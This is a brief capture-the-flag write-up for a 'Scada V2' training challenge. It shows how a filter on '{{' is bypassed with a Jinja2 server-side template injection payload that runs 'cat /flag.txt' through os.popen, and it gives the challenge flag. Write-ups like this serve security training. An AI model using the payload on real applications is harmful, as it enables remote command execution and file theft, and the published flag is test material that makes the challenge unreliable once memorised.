## Scada V2

[Link to challenge](https://training.cybersecuritychallenge.pt/challenges#Scada%20V2-12)

Write-up:

1. We are given access to a web application that has a login form that allows for username input first,
and only allows for the password after submitting username.
Also, we are told the flag is at /flag.txt.

2. Attempting the solution used in the previous Scada challenge shows us that some kind of input verification has been implemented.

3. After testing some different inputs similar to the previous solution, we can see that 
the only restriction is that we are not allowed to use `{{`.
To bypass this, we can use a {% %} statement with {% print() %}

    `{% with a=namespace.__init__.__globals__.__builtins__.__import__('os').popen("cat /flag.txt").read() %} {% print (a) %} {% endwith %}` <br>
    Flag: **CSCPT{w4fs_w0nt_h3lp_y0u_th1s_t1m3}**